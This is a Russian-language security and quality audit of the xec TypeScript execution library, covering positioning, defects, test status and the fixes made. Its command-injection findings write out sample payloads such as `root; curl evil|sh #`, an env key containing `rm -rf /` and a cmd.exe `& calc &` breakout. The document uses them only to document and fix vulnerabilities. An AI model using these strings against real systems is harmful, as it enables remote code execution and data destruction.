# Xec — аудит, стратегия и план приведения к индустриальному уровню

Дата аудита: 2026-08-03. Базовая версия: 0.9.0.
Объём анализа: 232 исходных файла / ~70 500 LOC в 6 пакетах + сайт.

---

## 1. Вердикт

**Идея проекта подтверждена рынком и уникальна. Реализация — нет.**

Исследование конкурентов (npm/GitHub API, 2026-08-03) показало: **ни один инструмент в экосистеме
JS/TS не объединяет local + SSH + Docker + Kubernetes под одним template-literal API.** zx (45.6k
звёзд, 2M загрузок/нед), execa (157M загрузок/нед), dax, Bun Shell — все заканчиваются на локальной
машине. Команды, которым нужно удалённое исполнение, вручную склеивают `execa` + `ssh2` (10.7M/нед)
+ `dockerode` (6.5M/нед) + `@kubernetes/client-node` (2.6M/нед). Именно этот шов закрывает xec.

Но реализация сегодня **не выдерживает собственных заявленных стандартов** и не готова к
продакшену в том виде, в каком заявлена. Ключевое:

| Заявление в CLAUDE.md | Реальность |
|---|---|
| «ZERO external dependencies» в core | На момент аудита 4 зависимости: `js-yaml`, `shell-escape`, `ssh2`, `zod`, причём `shell-escape` не импортировался нигде (удалён) |
| «100% Type Safety, no `any`» | 134 явных `any` только в `ops`; десятки в core/CLI |
| «No Silent Failures» | Найдено ≥6 фич, которые **молча делают ничего и рапортуют успех** |
| «100% Coverage Required» | ~9 538 LOC конфиг-системы — 0 тестов; 24 тест-файла CLI импортируют удалённые пути |
| «Security first» | 5 подтверждённых векторов инъекции команд, утечки паролей в ошибки |

Главная проблема не в количестве багов, а в их **классе**: система, исполняющая команды на
продакшен-инфраструктуре, содержит фичи, которые сообщают об успехе, ничего не выполнив. Это
опаснее падения.

---

## 2. Стратегия и позиционирование

### 2.1. Текущее состояние дистрибуции

- `@xec-sh/core` — **6 загрузок/нед**, `@xec-sh/cli` — **2 загрузки/нед**
- GitHub `xec-sh/xec` — **6 звёзд, 0 issues**, последний публичный push 2026-03-15
- Документация хорошо проиндексирована Google, но приводит на проект, который выглядит заброшенным

Фактически проект имеет нулевое внешнее доверие. Это меняет приоритеты: **сначала честность
и надёжность, потом объём фич.** Заявления уровня «high-reliability system» при 6 звёздах
работают против проекта, если код им не соответствует — их проверят.

### 2.2. Рекомендуемое позиционирование

> **Xec — слой исполнения для TypeScript-инфраструктуры.** Тот же `$`, что и в zx, но выполняется
> где угодно: локальная оболочка, SSH-парк, Docker-контейнеры, поды Kubernetes — с пулингом
> соединений, типизированными результатами и декларативным CLI из targets/tasks. Там, где zx
> заканчивается на ноутбуке, а Ansible требует Python и YAML, xec даёт TypeScript-командам
> (и их AI-агентам) один безопасный способ исполнять команды во всех средах.

**Слоган:** `One $ for every environment.`
Альтернативы: `Run anywhere. Type everything.` / `From laptop to cluster, same line of code.`

### 2.3. Три ниши по приоритету

1. **Execution substrate для AI-агентов** (окно открыто сейчас). Агентам нужно типобезопасное,
   аудируемое, защищённое от инъекций исполнение в разных средах. Существующие MCP-серверы для SSH
   — фрагментированные однохостовые обёртки. У xec уже есть маскирование секретов, лимиты, пулинг —
   официальный MCP-сервер поверх xec — самый дешёвый захват этой ниши. Риск: окно закроется за ~12 месяцев.
2. **CI/CD и деплой-скриптинг без клея.** Между «zx-скриптом» и «полноценным Pulumi/Terraform»
   сейчас пусто.
3. **Fleet/homelab-операции для TS-команд.** Ansible/pyinfra — Python, kamal — Ruby. TS-ответа нет.

**Чего НЕ делать:** не конкурировать в локальном исполнении. Оно коммодитизировано Bun Shell,
zx и execa. Любое позиционирование вокруг локального DX проиграно заранее.

### 2.4. Главные стратегические риски

1. Локальное исполнение коммодитизировано — вести нужно удалённым/унифицированным.
2. Дефицит доверия: 6 загрузок/нед против брендов Google и sindresorhus.
3. Мёртвое публичное присутствие: ритм публикаций — это тоже маркетинг.
4. Матрица поддержки: 6 пакетов × 4 адаптера × 3 рантайма при планке execa (релиз/нед, 1 open issue).
5. Ниша AI-агентов может закрыться MCP-native инструментами.

---

## 3. Критические дефекты (P0)

### 3.1. Инъекции команд

| # | Место | Суть |
|---|---|---|
| 1 | `core/utils/templates.ts:57` | Экранирование двойными кавычками: внутри `"..."` шелл по-прежнему раскрывает `$(...)`, `` ` ``, `$VAR`. `mkdir.execute($, {path:'$(id)'})` → выполняет `id`. **ИСПРАВЛЕНО** |
| 2 | `core/core/execution-engine.ts:366` | Тот же баг в `templates.render`, плюс значения без пробелов возвращались вообще без кавычек. **ИСПРАВЛЕНО** |
| 3 | `core/adapters/docker/docker-fluent-api/base.ts:588,590` и ещё ~18 мест | `getDockerCommand()` склеивает argv пробелами и отдаёт в `engine.raw` — нулевое экранирование. `.name('a; curl evil\|sh')` исполняется на **хосте** |
| 4 | `core/adapters/ssh/index.ts:566` | `sudo -u ${sudoConfig.user}` — сырая интерполяция. `user: "root; curl evil\|sh #"` = RCE |
| 5 | `core/adapters/ssh/index.ts:166` | Экранируется только *значение* env, ключ — сырой: `env: {'X=1; rm -rf /; A': 'v'}` |
| 6 | `ops/secrets/providers/git.ts:729,739` | `execSync(\`git commit -m "${message}"\`)` с неэкранированным `message` |
| 7 | `core/utils/shell-escape.ts:40` (Windows) | MSVCRT-экранирование `\"` для cmd.exe, который его не понимает: `a" & calc & "b` → запускает calc. **ИСПРАВЛЕНО** |

### 3.2. Молчаливые отказы — фичи, рапортующие успех, ничего не сделав

| # | Место | Суть |
|---|---|---|
| 8 | `core/adapters/ssh/index.ts:600` | `secure-askpass` sudo: heredoc склеен в **одну строку** через `&&`, `#!` начинает комментарий — вся пользовательская команда закомментирована. Remote выполняет только `cat`, возвращает 0 и пустой stdout. **Sudo-команды выглядят успешными, не выполнившись** |
| 9 | `core/adapters/docker/docker-fluent-api/base.ts:687` | `Array.isArray(TemplateStringsArray)` === true → все tagged-template вызовы уходят в ветку `.join(' ')`, **все интерполированные значения молча отбрасываются**. `db.exec\`psql -c "CREATE DATABASE ${name}"\`` → `CREATE DATABASE ;`. Ломает почти весь `databases.ts`/`messaging.ts`/`redis.ts` |
| 10 | `ops/config/task-executor.ts:628` | `when:` не реализован — сравнивает строку с `'true'`. Любое реальное условие → шаг **пропущен и помечен успешным** |
| 11 | `ops/config/task-executor.ts:341` | `step.task` — заглушка: подставляет `echo "Would execute task: X"` и ставит `success = true` |
| 12 | `ops/config/variable-interpolator.ts:225` | `${secrets.x}` не распознаётся (парсер знает только `secret:`) → возвращается **литерал строки**. Все примеры в документации используют `${secrets.…}`, то есть `password: ${secrets.db_password}` уходит в SSH как эта самая строка |
| 13 | `core/adapters/kubernetes/index.ts:570` | `portForwards` — Set, в который никогда ничего не добавляется. `dispose()` не закрывает ни один форвард, процессы `kubectl` остаются сиротами |
| 14 | `core/adapters/ssh/index.ts:1002` | `portForward` вызывает `forwardOut()` и выбрасывает результат — локальный listener не создаётся, форвард не работает |

### 3.2.1. Свидетельство реального потребителя (omnitron)

Omnitron — 49 файлов, использующих `@xec-sh/*`. Что показал разбор:

- **`$` — флагманский API — не используется ни разу.** Команды всегда приходят строкой из конфига
  или БД, а `$` требует tagged template. Обходятся через `engine.raw([command] as any)`.
- **`engine.run()` задокументирован в их коде как сломанный** (`execution.service.ts:112`):
  «engine.run() interpolates options into the command string which corrupts it».
  **Воспроизведено:** `$.run('echo hello', {cwd:'/tmp'})` → команда `e'{"cwd":"/tmp"}'cho hello`.
  Метод итерирует строку **посимвольно**, вставляя опции между символами. **ИСПРАВЛЕНО** —
  теперь бросает `TypeError` с указанием рабочих альтернатив.
- **Docker-адаптер «может зависать»** — два места сознательно обходят его ради
  `execFile('docker', …)` (`container-runtime.ts:198`, `infrastructure.service.ts:555`).
- **Всё, что типизировано в xec, деградирует до `any`** у потребителя — при том, что проект
  в остальном строго типизирован.
- **~2 690 строк обёрток**, и у каждой — полный запасной путь без xec: зависимость трактуется
  как опциональная в рантайме. Это самый громкий сигнал о недоверии к API.
- Конфиг-система, `.xec/`, tasks, targets — **0 использования**.

Вывод для стратегии: главная ценность 1.0 для существующего потребителя — не новые фичи,
а стабильный типизированный API, позволяющий удалить половину этих 2 700 строк.

### 3.3. Безопасность данных

| # | Место | Суть |
|---|---|---|
| 15 | `core/adapters/ssh/index.ts:442` | Ключ пула соединений = `user@host:port` **без учёта пароля/ключа**. Два вызова с разными кредами разделяют одно соединение — обход аутентификации. **ИСПРАВЛЕНО** |
| 15a | `core/adapters/ssh/ssh.ts` (весь SSH) | **Проверки ключа хоста не было вообще.** `ssh2` без `hostVerifier` принимает любой предъявленный ключ — то есть machine-in-the-middle читает все команды и учётные данные сессии. Найдено при разборе правки scp, где проверку сняли «для согласованности». **ИСПРАВЛЕНО**: реализован разбор `known_hosts` (включая хешированные записи), политика `accept-new` по умолчанию, `strict` для CI, `off` только для тестовых фикстур |
| 16 | `core/core/error.ts:41` | Санитизация ошибок отключалась при `NODE_ENV=test`/`VITEST_WORKER_ID` — то есть **ровно в CI**, где логи наиболее публичны. **ИСПРАВЛЕНО** |
| 17 | `core/adapters/base-adapter.ts:176` → `error.ts:91` | `TimeoutError` встраивал сырую команду с `printf '%s\n' 'PASSWORD' \| sudo -S`. **ИСПРАВЛЕНО** |
| 18 | `core/adapters/ssh/index.ts:593` | Askpass-скрипт с паролем в `/tmp/askpass-<rnd>.sh`; `Math.random().toString(36).substring(7)` даёт 0–3 символа (иногда пустую строку), `chmod 700` выполняется **после** записи |
| 19 | `core/adapters/base-adapter.ts:141` | Маскирование секретов работает **по чанкам** без буферизации — секрет на границе чанков утекает в поток целиком |
| 20 | `core/core/execution-engine.ts:251` | Событие `command:start` эмитит сырую команду и **весь объект env** — то есть все секреты |
| 21 | `ops/config/task-executor.ts:87` | Весь `process.env` пробрасывается на удалённые хосты: локальные `AWS_*`, токены уезжают на SSH/Docker/K8s |
| 22 | `ops/config/configuration-manager.ts:121,279` | `load()` подменяет `merged` разрешённым конфигом, `save()` пишет его на диск — **секреты в открытом виде попадают в `.xec/config.yaml`** |
| 23 | `ops/config/variable-interpolator.ts:388` | Загрузка конфига исполняет произвольный шелл (`${cmd:...}`), а поиск конфига идёт вверх по дереву каталогов — `cd` в чужой репозиторий + `xec` = выполнение их кода |

### 3.4. Лицензионное нарушение

**`@xec-sh/kit` содержит ~2 691 LOC (25% пакета), скопированных практически дословно из
`@clack/core` и `@clack/prompts`** (MIT, © Nate Moore, bombshell-dev/clack), плюс
`is-unicode-supported` (© Sindre Sorhus). Доказательства: идентичная логика и структура,
самоидентифицирующие имена (`ClackState`, `ClackSettings`, `Symbol('clack:cancel')`), комментарий
со ссылкой на issue #176 апстрима.

`packages/kit/LICENSE` содержит только «Copyright (c) 2025 LuxQuant». **MIT требует сохранения
копирайта в копиях.** Это нужно исправить до любой публичной активности — обнаружение такого
факта сообществом нанесёт репутационный ущерб, несопоставимый с ценой исправления (добавить
NOTICE с атрибуцией).

---

## 4. Архитектурные дефекты

### 4.1. Дублирование и разрастание CLI

- `in.ts` ↔ `on.ts` — **~129 идентичных строк** (53 блока). `executeTask()` существует в трёх
  расходящихся копиях, `executeParallel()` — в трёх **разных алгоритмах** для одной задачи.
- `runInteractiveMode()` — 7 независимых реализаций.
- Zod-схема с хвостом `profile/verbose/quiet/dryRun` скопирована дословно в 7 файлов.
- `tasks.ts` (332 LOC) **полностью мёртв**: не зарегистрирован, ноль импортов. При этом
  `run.ts:266` советует пользователю «Run `xec tasks`» — команды не существует.
- `new.ts` — 2 424 LOC, из них ~850 — строковые шаблоны исходников.

### 4.2. Несогласованность UX

- **Четыре механизма вывода**: глобальный `-o/--output`, `--format` в `inspect`, `--json` в
  `logs`/`config`, `-f/--format` в `secrets`.
- **`-f` означает пять разных вещей**: `--force`, `--follow`, `--filter`, `--file`, `--format` —
  причём в одном дереве `secrets` это одновременно `--force` и `--format`.
- **Пять синтаксисов таргета**: `on <hosts>`, `in containers.x`, `copy target:path`,
  `logs [target] [path]`, `forward <target> <port-mapping>`.
- Рекламируемые флаги, кидающие «not implemented»: `--aggregate` в `logs`, `-r/--reverse` в `forward`.
- 62 вызова `process.exit()` в обход `handleError`; 78 голых `throw new Error()`.
- `throw new Error('cancelled')` как поток управления, ловится через `message.includes('cancelled')` —
  любая настоящая ошибка со словом «cancelled» проглатывается как отмена пользователем.

### 4.3. Разрастание core за пределы своей задачи

`docker-fluent-api/services/*` — **~2 500 LOC пресетов в стиле testcontainers** внутри движка
исполнения команд: `redis.ts` (906), `messaging.ts` (641), `databases.ts` (553), `ssh.ts` (423).
Качество: жёстко зашитые порты (два Kafka не сосуществуют), несуществующий тег
`redis/redis-stack:alpine`, путь `undefined-zk`, вызовы `rabbitmqadmin`, которого нет в образе,
дефолтные креды `user/password`. Покрытие — только проверки конфиг-объектов; ни один `start()`
или `exec()` не выполняется в тестах, поэтому дефект №9 и выжил.

### 4.4. Реальность тестов

- **Ложные тесты**: `test/unit/utils/audit-logger.test.ts` — 7 строк, `describe.skip` с заглушкой.
- **Битый бенчмарк**: `test/performance/masking-benchmark.ts` импортирует несуществующий
  `masking-optimizer.js`; файл не `.test.ts`, поэтому vitest его не собирает и не падает.
- **Молчаливый no-op**: `docker/redis-cluster.test.ts` выходит из `beforeAll` при отсутствии
  Docker — тесты зеленеют, ничего не проверив.
- **Мёртвый набор CLI — хуже, чем казалось.** Замер на живом прогоне: **40 из 44 тест-файлов
  `apps/xec` падают** (69 упавших тестов), потому что импортируют `../../src/{config,secrets,api,
  utils}/…` — всё это переехало в `packages/ops` и в `apps/xec/src` больше не существует. Каждый
  сломанный импорт разрешается в существующий модуль `packages/ops/src`, то есть покрытие
  восстановимо переносом, а не переписыванием. Причём эти тесты покрывают больше модулей
  (`target-resolver`, `task-manager`, `crypto`, `machine-id`, `api/*`), чем есть в `ops` сейчас.
- Флаги `XECSH_TEST_SSH`/`_DOCKER`/`_K8S` из CLAUDE.md **не существуют** в коде.
- Полностью без покрытия: `process-context.ts` (488), `docker-api.ts` (329), `suggestions.ts` (322),
  `interactive.ts` (263), `ssh-api.ts` (205), `kubernetes-utils.ts` (175), 90% `transfer.ts`.

### 4.5. Документация против кода

- `api/index.md:208` документирует `createSSHPool` — **функции не существует**.
- ~~`execution-engine/overview.md:32` — `.pod()` не существует~~ — **находка ошибочна, снята.**
  Проверено чтением кода (`kubernetes-api.ts:109,315`) и вызовом в рантайме:
  `$.k8s().pod('my-pod').exec` работает. Документация была права, аудит — нет.
- ~~`execution-engine/overview.md:24` — `username` вместо `user`~~ — **находка ошибочна, снята.**
  `SSHAdapterOptions.username` (`types/command.ts:21`) — верное имя поля; `user` относится
  к блоку `sudo`. Документация была права. Путаницу вносило то, что YAML-конфиг таргетов
  действительно использует `user` — это уточнение теперь явно написано в `quick-start.md`.
- `commands/overview.md` ссылается на 4 несуществующих файла и на `main()`, которой нет.
- Обещаны нереализованные `$import`, `extends: [a,b]`, `xec config cache enable`, `scripts.sandbox`.
- Три взаимно противоречащих описания приоритета конфигурации в трёх файлах.
- `website/docs/ops/*` (9 файлов) не подключены к `sidebars.ts` — недостижимы.

### 4.6. Оценка пакетов

| Пакет | LOC | Тесты | Вердикт |
|---|---|---|---|
| `core` | 21 234 | 114 файлов | **Ядро продукта.** Вырезать `docker-fluent-api/services/*`, починить адаптеры |
| `ops` | 15 199 | 4 файла | **Расформировать.** `config`/`secrets` (9 538 LOC) → в CLI; `deploy`/`pipeline`/`workflow`/`health`/`discovery` (1 335 LOC) — ноль использования в CLI |
| `kit` | 10 636 | 38 файлов | **Оставить, но:** добавить атрибуцию MIT; таблицы (3 836 LOC, 36%) не используются никем вне пакета |
| `loader` | 4 335 | 18 файлов | Оставить |
| `testing` | 1 423 | **0** | Оставить, покрыть тестами |

Показательная инверсия: единственные протестированные модули `ops` (`health`, `pipeline`,
`retry`, `workflow`) — это ровно те, которые **никем не используются**. А `config`/`secrets`,
через которые проходит каждая команда CLI, не имеют тестов вообще.

---

## 5. План работ

### Этап 0 — Правовое и репутационное (немедленно)
- [x] Атрибуция MIT для clack/is-unicode-supported в `packages/kit`
- [x] Привести CLAUDE.md в соответствие с реальностью (убраны ложные заявления)
- [x] Удалить мёртвую зависимость `shell-escape` из core

### Этап 1 — Безопасность (P0)
- [x] Переписать слой экранирования: shell-aware диалекты posix/cmd/powershell
- [x] Устранить инъекции в `templates.ts` и `execution-engine.ts`
- [x] Убрать отключение санитизации по `NODE_ENV=test`
- [x] Закрыть утечку пароля в `TimeoutError`
- [x] Экранирование в SSH: валидация sudo user и имён env-переменных
- [x] Ключ пула соединений с учётом кредов (SHA-256 отпечаток)
- [x] Буферизация маскирования на границах чанков
- [x] Убрать env из события `command:start`
- [x] Экранирование в docker-fluent-api — все ~21 вызова `engine.raw` заменены на argv-массивы
- [x] Инъекция в `ops/secrets/providers/git.ts` — переход на `execFileSync` без оболочки

### Этап 2 — Молчаливые отказы (P0)
- [x] Починить sudo heredoc в SSH-адаптере — проверено на 6 дистрибутивах
- [x] Починить детект template literals в docker-fluent-api
- [x] `when:` — реализован полноценный evaluator (без `eval`), неразрешимое условие валит шаг
- [x] `step.task` — реализовано настоящее вложенное исполнение с защитой от циклов
- [x] `${secrets.x}` — поддержан; неразрешимая ссылка теперь бросает ошибку, а не литерал
- [x] `engine.run()` — посимвольное искажение команды, теперь явная ошибка
- [ ] Регистрация port-forward в K8s/SSH

### Этап 3 — Архитектура
- [ ] Вырезать `docker-fluent-api/services/*` из core
- [ ] Расформировать `ops`
- [ ] Общий слой для команд CLI (устранить дублирование in/on/logs/copy)
- [ ] Удалить мёртвый `tasks.ts`, зарегистрировать или убрать
- [ ] Унифицировать вывод, флаги и синтаксис таргетов
- [ ] Убрать 4 фиктивные зависимости core или признать их честно

### Этап 4 — Тесты
- [x] Восстановить мёртвый набор `apps/xec/test/{config,secrets,api,utils}` — перенесён в `ops`
- [x] Покрыть `config`/`secrets` — с 4 файлов до 35 (754 теста)
- [ ] Заменить молчаливые skip на явные
- [ ] Починить/удалить битый бенчмарк и фиктивный `audit-logger.test.ts`
- [ ] Починить доисторические падения `apps/xec/test/commands/{new,watch}.test.ts`
- [ ] Ограничить параллелизм SSH-тестов (исчерпывают лимит подключений sshd)
- [ ] Починить фикстуру `manjaro-pacman` (отвергает аутентификацию)

### Этап 5 — Документация и сайт
- [ ] Ребрендинг: логотип, айдентика, hero, позиционирование
- [ ] Привести docs в соответствие с кодом, подключить `ops/*` к sidebars
- [ ] Удалить обещания нереализованных фич

---

## 6. Состояние проверок на момент правок

| Проверка | Результат |
|---|---|
| `tsc --noEmit` по всем 6 пакетам | чисто |
| `packages/core` unit-тесты | **1831 прошло / 2 упало** (единственное падение — тест Kubernetes, которому нужен живой kind-кластер; его API-сервер недоступен) |
| `packages/core` SSH-адаптер (реальные контейнеры) | 118/118 |
| `packages/ops` | **952 теста / 35 файлов** (было 4 файла / 31 тест). 2 падения воспроизводятся только под параллельной нагрузкой и проходят изолированно: тест `when:` с реальным исполнением команды и тест постоянного времени сравнения (2.01 мс против порога 2 мс) |
| `apps/xec` | было 40 из 44 файлов упавших (69 тестов) → **390 проходят, 0 падений**. Тесты, принадлежавшие `ops`, перенесены туда |
| `packages/kit` | **848 проходят** (было 348 падений из-за определения цвета по TTY — упало бы в любом CI) |
| `packages/loader` | **384 проходят** |

Замечание по прогонам: полный `vitest run` в `packages/core` при параллельном запуске исчерпывает
лимит подключений sshd в тестовых контейнерах и даёт ложные падения
(`Connection lost before handshake`). Изолированный прогон тех же файлов — зелёный. Контейнер
`manjaro-pacman` отвергает аутентификацию даже без sudo и ломает все параметризованные им тесты —
это дефект фикстуры, а не продукта.

## 7. Что уже сделано в этой сессии

### Безопасность
1. **Переписан `packages/core/src/utils/shell-escape.ts`** — корректное экранирование для трёх
   диалектов, выбор диалекта по **целевой оболочке**, а не по платформе хоста; пустые и nullish
   значения больше не исчезают, сдвигая argv.
2. **Устранены две инъекции** в `templates.ts` и `execution-engine.ts` + тесты, доказывающие
   нейтрализацию `$(id)`, `` `id` ``, `$HOME`, `'; id; '`.
3. **Санитизация ошибок больше не отключается** в тестовой среде и CI.
4. **`TimeoutError` больше не раскрывает** содержимое команды с кредами.
5. **Валидация sudo-пользователя и имён env-переменных** — значения вроде
   `root; curl evil | sh` теперь отвергаются как ошибка конфигурации, а не исполняются.
6. **Ключ пула SSH-соединений включает отпечаток учётных данных** — устранён обход
   аутентификации при совпадении `user@host:port` и разных ключах/паролях.
7. **Маскирование секретов работает через границы чанков** (`utils/masking-stream.ts`).
   Раньше каждый чанк маскировался отдельно, поэтому секрет, разорванный чтением из пайпа
   (`TOKEN=` в конце одного чанка, значение в начале следующего), не совпадал ни с одним
   паттерном и уходил в лог целиком. Удержание ограничено 64 КБ и всегда освобождается;
   PEM-блоки удерживаются до полного футера. 7 тестов, включая посимвольную подачу.
8. **События больше не публикуют секреты.** `command:start` отдавал **весь объект env**;
   теперь только имена переменных (`envKeys`), а команда и текст ошибки маскируются.
   Паттерны вынесены в общий `utils/sensitive-patterns.ts` — теперь это **фабрика**,
   а не общий массив: у регулярных выражений флаг `g`, и разделяемые экземпляры портили
   друг другу `lastIndex`, из-за чего маска могла пропустить совпадение.

### Молчаливые отказы
9. **Починен sudo через `secure-askpass`.** Heredoc склеивался в одну строку через ` && `, где
   `#!/bin/sh` начинал комментарий и съедал команду: удалённый хост выполнял только `cat`,
   возвращал 0 и пустой вывод. Проверено эмпирически на 6 дистрибутивах:

   | | старое поведение | новое |
   |---|---|---|
   | `sudo whoami` | `""` (команда не выполнялась) | `root` |
   | `sudo id -u` | `""` | `0` |
   | без sudo (контроль) | `user` | `user` |
   | временные askpass-файлы | оставались на хосте | удаляются |

10. **Удалён мёртвый `buildSudoCommand`** (52 строки), содержавший неожидаемый `await`
   у асинхронной функции — генерировал `SUDO_ASKPASS=[object Promise]`.

### Семантика и выразительность
11. **`sudo` теперь выполняет команду целиком в привилегированной оболочке** (`sudo sh -c '…'`).
   Раньше внешняя оболочка успевала раскрыть `$(...)`, применить перенаправления и разбить
   конвейеры **до** запуска sudo — `echo $(whoami)` возвращал непривилегированного пользователя,
   а `cmd > /root/f` падал по правам.
12. **Строковые шорткаты целей** — `$.ssh('deploy@web-1:2222')` и `$.k8s('prod/api-pod:sidecar')`
    вместо объектов конфигурации. Поддержаны IPv6 (в скобках и без), порт по умолчанию,
    имя пользователя по умолчанию как у `ssh`. 23 теста, включая некорректные входные данные.

### Правовое
13. **Оформлена атрибуция MIT** для `@clack/core`/`@clack/prompts` (© Nate Moore) и
    `is-unicode-supported` (© Sindre Sorhus): файл `NOTICE`, ссылка в `LICENSE`, заголовки
    в 9 заимствованных файлах, `NOTICE` добавлен в `files` пакета (иначе не попадал в публикацию).

### Айдентика
14. **Новый логотип и айдентика**: знак «промпт, расходящийся к трём средам», образующий «X»;
    палитра сменена с обобщённой бирюзовой на фиолетово-циановую (#6D3BF5 → #22D3EE);
    сгенерированы `logo.svg`, `logo-dark.svg`, `favicon.svg`, многоразмерный `favicon.ico`,
    `logo.png`, социальная карточка 1200×630.
